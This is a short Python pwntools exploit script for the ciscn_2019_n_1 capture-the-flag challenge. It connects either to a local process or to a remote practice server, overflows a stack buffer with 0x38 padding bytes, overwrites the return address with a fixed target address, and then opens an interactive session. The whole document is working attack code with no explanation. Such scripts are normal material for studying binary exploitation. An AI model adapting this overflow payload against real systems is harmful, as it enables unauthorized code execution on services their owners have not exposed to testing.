import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	if len(sys.argv)==1 :
		io=process('./ciscn_2019_n_1')
		elf=ELF('./ciscn_2019_n_1')
		libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
	else :
		io=remote('node3.buuoj.cn',28956)
		elf=ELF('./ciscn_2019_n_1')
		#libc=ELF('')


	io.recv()
	io.sendline('a'*0x38+p64(0x4006BE))

	#gdb.attach(io)
	#pause()
	io.interactive()